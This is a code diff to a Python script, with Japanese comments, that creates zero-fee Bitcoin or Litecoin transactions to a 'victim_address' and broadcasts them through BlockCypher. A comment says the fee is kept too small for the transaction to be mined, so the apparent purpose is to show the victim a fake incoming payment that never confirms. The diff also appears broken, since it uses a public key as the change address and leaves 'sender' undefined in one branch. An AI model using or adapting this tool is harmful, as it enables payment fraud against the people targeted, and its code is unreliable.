@@ -78,10 +78,16 @@ transaction_util = cryptos.Bitcoin(testnet=testnet)
 if "ltc" in coin_symbol:
     print("litecoin")
     transaction_util = cryptos.Litecoin(testnet=testnet)
+    sender  = transaction_util.privtopub(fake_send_from)
+    address = transaction_util.pubtoaddr(sender)
+    balance = transaction_util.get_balance(address)
+    inputs  = transaction_util.get_unspents(address)
+else:
+    balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
+    inputs  = transaction_util.unspent(transaction_util.wiftoaddr(fake_send_from))
+    balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
+
 print("OK")
-balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
-inputs  = transaction_util.unspent(transaction_util.wiftoaddr(fake_send_from))
-balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
 if balance["confirmed"] <= 0:
     balance = balance["unconfirmed"]
 else:
@@ -95,12 +101,12 @@ if balance < send_amount:
 
 fee = 0 # ここはマインングできないくらい著しく小さな値にすることが重要。
 
-change_btc_amt = (balance - send_amount) #おつり
+change_btc_amt = (balance - send_amount) - fee #おつり
 
 if testnet:
-    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
+    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": sender, "value": change_btc_amt}]
 else:
-    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
+    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": sender, "value": change_btc_amt}]
 
 tx_victim = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
 if testnet:
@@ -131,9 +137,11 @@ print()
 time.sleep(3) #詠唱中...  -u- 
 
 print("SND TMP ITX TOBC  (ブロックチェーンに一時的な不正なトランザクションを送信!)")
+time.sleep(2)
 blockcypher.pushtx(tx_victim,
                    coin_symbol=coin_symbol,
                    api_key=token)
+
 #txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=0)
 #transaction_util.pushtx(tx_victim)
 #broadcast_transaction(tx_victim, testnet)
@@ -159,5 +167,5 @@ print("----------------")
 balance = transaction_util.get_balance(victim_address)
 print(f"fake send to address Balance (satoshi unit) :{balance}")
 print()
-print("Tips : If you are unable to send from the program side, why not try sending manually using the service at the following URL?: https://live.blockcypher.com/")
+print("Tips : If you are unable to send from the program side, why not try sending manually using the service at the following URL?: https://live.blockcypher.com/pushtx")
 print("Done.")
